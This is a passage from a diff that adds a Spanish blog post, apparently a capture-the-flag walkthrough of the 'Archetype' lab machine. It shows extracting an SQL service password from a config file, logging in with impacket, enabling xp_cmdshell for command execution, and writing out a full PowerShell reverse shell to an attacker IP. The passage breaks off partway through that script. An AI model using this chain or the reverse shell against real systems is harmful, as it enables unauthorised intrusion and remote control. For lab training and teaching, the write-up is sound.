+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;El comando anterior invoca a la herramienta &lt;code&gt;get&lt;/code&gt; la cual se utiliza para
+transferir archivos, por lo cual al ejecutarlo vamos a transferir una copia
+del archivo &lt;code&gt;prod.dtsConfig&lt;/code&gt; a nuestro equipo. Con el archivo en nuestro equipo
+podemos ver su&amp;nbsp;contenido.&lt;/p&gt;
+&lt;p&gt;De vuelta a nuestro equipo, podemos utilizar el comando &lt;code&gt;cat prod.dtsConfig&lt;/code&gt; el
+cual nos arrojara el contenido del&amp;nbsp;archivo.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;DTSConfiguration&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;DTSConfigurationHeading&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;DTSConfigurationFileInfo&lt;/span&gt; &lt;span class="na"&gt;GeneratedBy=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;GeneratedFromPackageName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;GeneratedFromPackageID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;GeneratedDate=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;20.1.2019 10:01:34&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;/DTSConfigurationHeading&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;Configuration&lt;/span&gt; &lt;span class="na"&gt;ConfiguredType=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Property&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Path=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;\Package.Connections[Destination].Properties[ConnectionString]&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;ValueType=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;String&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;ConfiguredValue&amp;gt;&lt;/span&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;span class="nt"&gt;&amp;lt;/ConfiguredValue&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;/Configuration&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/DTSConfiguration&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Del contenido del archivo anterior nos llaman la atención la siguiente&amp;nbsp;línea:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;ConfiguredValue&amp;gt;&lt;/span&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;span class="nt"&gt;&amp;lt;/ConfiguredValue&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La cadena anterior corresponde a la cadena para una conexión &lt;code&gt;SQL&lt;/code&gt; asociada al
+usuario &lt;code&gt;ARCHETYPE\sql_svc&lt;/code&gt; (de &lt;code&gt;Windows&lt;/code&gt;) y su contraseña que es &lt;code&gt;M3g4c0rp123&lt;/code&gt;.&lt;/p&gt;
+&lt;h2&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;Ya tenemos un usuario y contraseña, por lo que podemos intentar dar un primer
+paso firme hacia nuestra máquina objetivo &amp;#8230; peeeeero, eso será después porqué
+en este momento necesito dejar el post pausado una vez más y conectarme a hacer
+algunos pendientes del trabajo&amp;nbsp;:)&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Continuación:&amp;nbsp;2020-11-06&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Ola k ase &amp;#8230; bueno, ya pasaron casi tres meses de que comencé a escribir este
+texto y pues apenas vamos a darle un cierre haha en realidad hubo muchas cosas
+que se escribieron en este tiempo pero algunas las borre sin querer y otras
+estan a medias esperando a ser publicada, en fin, continuemos con lo que toca&amp;nbsp;aquí.&lt;/p&gt;
+&lt;p&gt;Bien, ya hemos obtenido un usuario y contraseña para una conexión de
+&lt;code&gt;SQL Server&lt;/code&gt; de un usuario de &lt;code&gt;Windows&lt;/code&gt;, hay que tener en cuenta que aunque el
+usuario es de &lt;code&gt;Windows&lt;/code&gt; la configuración de permisos puede ser diferente dentro de
+&lt;code&gt;SQL Server&lt;/code&gt; que en &lt;code&gt;Windows&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Para conectar a &lt;code&gt;SQL Server&lt;/code&gt; podemos utilizar &lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt; el cual es una colección de clases en &lt;code&gt;Python&lt;/code&gt; para
+trabajar con protocolos de&amp;nbsp;red.&lt;/p&gt;
+&lt;p&gt;Para obtener &lt;code&gt;impacket&lt;/code&gt; necesitamos clonarlo de su repositorio de &lt;code&gt;GitHub&lt;/code&gt; ya
+que no viene instalado por defecto en nuestro sistema. Clonamos el&amp;nbsp;repo.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git clone https://github.com/SecureAuthCorp/impacket.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code&gt;impacket&lt;/code&gt; cuenta con algunos scripts de ejemplo en la carpeta &lt;code&gt;/examples&lt;/code&gt;, de
+ahí podemos utilizar &lt;code&gt;mssqlclient.py&lt;/code&gt; el cual sirve para realizar conexiones a
+servidores de &lt;code&gt;SQL Server&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;El comando recomendado&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pero en nuestro caso utilizaremos el&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos ver, hemos mandado &lt;code&gt;mssqlclient.py&lt;/code&gt; directamente a la entrada de
+&lt;code&gt;Python3&lt;/code&gt;, y hemos indicado las&amp;nbsp;banderas:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ARCHETYPE/sql_svc&lt;/code&gt;: es el&amp;nbsp;usuario.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@10.10.10.27&lt;/code&gt;: es el host o equipo a&amp;nbsp;conectarnos.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-windows-auth&lt;/code&gt;: indicamos que nos vamos a autenticar con las credenciales de &lt;code&gt;Windows&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Al introducir el comando nos va a solicitar la contraseña del usuario, la
+obtuvimos anteriormente (&lt;code&gt;M3g4c0rp123&lt;/code&gt;). Se realizará la conexión y se nos
+habilitará una terminal de &lt;code&gt;SQL&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Impacket v0.9.21 - Copyright &lt;span class="m"&gt;2020&lt;/span&gt; SecureAuth Corporation
+
+Password:
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Encryption required, switching to TLS
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ENVCHANGE&lt;span class="o"&gt;(&lt;/span&gt;DATABASE&lt;span class="o"&gt;)&lt;/span&gt;: Old Value: master, New Value: master
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ENVCHANGE&lt;span class="o"&gt;(&lt;/span&gt;LANGUAGE&lt;span class="o"&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ENVCHANGE&lt;span class="o"&gt;(&lt;/span&gt;PACKETSIZE&lt;span class="o"&gt;)&lt;/span&gt;: Old Value: &lt;span class="m"&gt;4096&lt;/span&gt;, New Value: &lt;span class="m"&gt;16192&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; INFO&lt;span class="o"&gt;(&lt;/span&gt;ARCHETYPE&lt;span class="o"&gt;)&lt;/span&gt;: Line &lt;span class="m"&gt;1&lt;/span&gt;: Changed database context to &lt;span class="s1"&gt;&amp;#39;master&amp;#39;&lt;/span&gt;.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; INFO&lt;span class="o"&gt;(&lt;/span&gt;ARCHETYPE&lt;span class="o"&gt;)&lt;/span&gt;: Line &lt;span class="m"&gt;1&lt;/span&gt;: Changed language setting to us_english.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ACK: Result: &lt;span class="m"&gt;1&lt;/span&gt; - Microsoft SQL Server &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;140&lt;/span&gt; &lt;span class="m"&gt;3232&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Press &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; extra shell commands
+SQL&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos una conexión en el servidor. Ahora vamos a verificar si tenemos
+permisos de administrador. Para esto podemos utilizar la función
+&lt;a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15"&gt;IS_SRVROLEMEMBER&lt;/a&gt;
+la cual nos permite saber si un inicio de sesión de &lt;code&gt;SQL Server&lt;/code&gt; es miembro
+de un rol especifico del&amp;nbsp;servidor.&lt;/p&gt;
+&lt;p&gt;La sintaxis de la función&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;IS_SRVROLEMEMBER&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;role&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En la cual tenemos dos&amp;nbsp;argumentos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;role&lt;/code&gt;: indicamos el rol a revisar que puede ser alguno de los siguientes.&lt;ul&gt;
+&lt;li&gt;sysadmin&lt;/li&gt;
+&lt;li&gt;serveradmin&lt;/li&gt;
+&lt;li&gt;dbcreator&lt;/li&gt;
+&lt;li&gt;setupadmin&lt;/li&gt;
+&lt;li&gt;bulkadmin&lt;/li&gt;
+&lt;li&gt;securityadmin&lt;/li&gt;
+&lt;li&gt;diskadmin&lt;/li&gt;
+&lt;li&gt;public&lt;/li&gt;
+&lt;li&gt;processadmin&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;login&lt;/code&gt;: es el nombre del servidor &lt;code&gt;SQL&lt;/code&gt; a revisar, por defecto su valor es
+    &lt;code&gt;NULL&lt;/code&gt; y toma como referencia el servidor en el que hemos iniciado&amp;nbsp;sesión.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Explicado lo anterior, en nuestra sesión de &lt;code&gt;SQL Server&lt;/code&gt; uitlizaremos el
+siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SQL&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IS_SRVROLEMEMBER&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sysadmin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Su salida&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;-----------   &lt;/span&gt;
+
+          &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;El cual nos da como salida un valor numérico de &lt;code&gt;1&lt;/code&gt; el cual representa que el
+la sesión iniciada es miembro del rol solicitado, osea, tenemos permisos de
+&lt;code&gt;sysadmin&lt;/code&gt; en el &lt;code&gt;SQL Server&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Como tenemos permisos de administrador podemos utilizar algunas herramientas de
+configuración del servidor &lt;code&gt;SQL&lt;/code&gt; para habilitar una conexión&amp;nbsp;remota.&lt;/p&gt;
+&lt;p&gt;Para esto podemos utilizar &lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15"&gt;sp_configure&lt;/a&gt;
+el cual nos permite modificar configuraciones globales del&amp;nbsp;servidor.&lt;/p&gt;
+&lt;p&gt;Su sintaxis es la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;sp_configure&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;configname&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hadoop connectivity&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+             &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;configvalue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos ver toma dos parámetros, el nombre de la configuración y su valor.
+El valor depende directamente de la configuración que estamos modificando. Una
+vez que hemos cambiado alguna configuración es necesario utilizar &lt;code&gt;reconfigure;&lt;/code&gt;
+para que se apliquen los&amp;nbsp;cambios.&lt;/p&gt;
+&lt;p&gt;Si ejecutamos &lt;code&gt;sp_configure;&lt;/code&gt; podemos ver una lista de configuraciones
+disponibles, sin embargo estamos buscando una que nos permita habilitar una
+conexión remota. Para esto habilitaremos que se muestren las opciones&amp;nbsp;avanzadas.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SQL&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;EXEC&lt;/span&gt; &lt;span class="n"&gt;sp_configure&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Show Advanced Options&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;SQL&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;reconfigure&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Al habilitar que nos muestre las opciones avanzadas podremos ver que hay una
+configuración llamada &lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15"&gt;xp_cmdshell&lt;/a&gt;
+la cual nos permite invocar una terminal de comandos de Windows y enviarle una
+cadena a&amp;nbsp;ejecutar.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;EXEC&lt;/span&gt; &lt;span class="n"&gt;sp_configure&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;reconfigure&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya habilitamos la configuración para utilizar &lt;code&gt;xp_cmdshell&lt;/code&gt;, podemos verificar
+los permisos o alcance de nuestra cuenta dentro de &lt;code&gt;Windows&lt;/code&gt; utilizando el
+comando &lt;code&gt;whoami&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;xp_cmdshell&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Su salida&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;output&lt;/span&gt;                                                                             
+
+&lt;span class="c1"&gt;--------------------------------------------------------------------------------   &lt;/span&gt;
+
+&lt;span class="n"&gt;archetype&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;sql_svc&lt;/span&gt;                                                                  
+
+&lt;span class="k"&gt;NULL&lt;/span&gt;                                                                               
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos observar que se nos vuelve a desplegar el usuario &lt;code&gt;archetype\sql_svc&lt;/code&gt;,
+esto significa que &lt;code&gt;SQL Server&lt;/code&gt; esta corriendo con ese usuario dentro de
+&lt;code&gt;Ẁindows&lt;/code&gt;, y podemos ver un &lt;code&gt;NULL&lt;/code&gt; lo cual significa que no tiene permisos de&amp;nbsp;administrador.&lt;/p&gt;
+&lt;p&gt;Necesitamos una mejor terminal. Intentemos crear una reverse shell mediante
+&lt;code&gt;PowerShell&lt;/code&gt;. Para esto podemos utilizar el siguiente&amp;nbsp;código:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; New-Object System.Net.Sockets.TCPClient&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.3&amp;quot;&lt;/span&gt;,443&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$client&lt;/span&gt;.GetStream&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;byte&lt;span class="o"&gt;[]]&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;..65535&lt;span class="p"&gt;|&lt;/span&gt;%&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$stream&lt;/span&gt;.Read&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;, &lt;span class="m"&gt;0&lt;/span&gt;, &lt;span class="nv"&gt;$bytes&lt;/span&gt;.Length&lt;span class="o"&gt;))&lt;/span&gt; -ne &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;New-Object -TypeName System.Text.ASCIIEncoding&lt;span class="o"&gt;)&lt;/span&gt;.GetString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;,0, &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$sendback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;iex &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Out-String &lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$sendback2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$sendback&lt;/span&gt; + &lt;span class="s2"&gt;&amp;quot;# &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$sendbyte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;([&lt;/span&gt;text.encoding&lt;span class="o"&gt;]&lt;/span&gt;::ASCII&lt;span class="o"&gt;)&lt;/span&gt;.GetBytes&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendback2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$stream&lt;/span&gt;.Write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;,0,&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;.Length&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$stream&lt;/span&gt;.Flush&lt;span class="o"&gt;()}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$client&lt;/span&gt;.Close&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La linea anterior es necesario guardarla en un archivo en tu equipo, vamos a
+llamar al archivo &lt;code&gt;shell.ps1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Ahora que lo hemos guardado en un archivo, solo por no dejar, vamos a expandir
+la linea anterior, simplemente queremos que se vea un poco mejor lo que&amp;nbsp;hace.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; New-Object System.Net.Sockets.TCPClient&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.3&amp;quot;&lt;/span&gt;,443&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nv"&gt;$stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$client&lt;/span&gt;.GetStream&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;byte&lt;span class="o"&gt;[]]&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;..65535&lt;span class="p"&gt;|&lt;/span&gt;%&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$stream&lt;/span&gt;.Read&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;, &lt;span class="m"&gt;0&lt;/span&gt;, &lt;span class="nv"&gt;$bytes&lt;/span&gt;.Length&lt;span class="o"&gt;))&lt;/span&gt; -ne &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;New-Object -TypeName System.Text.ASCIIEncoding&lt;span class="o"&gt;)&lt;/span&gt;.GetString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;,0, &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$sendback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;iex &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Out-String &lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$sendback2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$sendback&lt;/span&gt; + &lt;span class="s2"&gt;&amp;quot;# &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$sendbyte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;([&lt;/span&gt;text.encoding&lt;span class="o"&gt;]&lt;/span&gt;::ASCII&lt;span class="o"&gt;)&lt;/span&gt;.GetBytes&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendback2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$stream&lt;/span&gt;.Write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;,0,&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;.Length&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
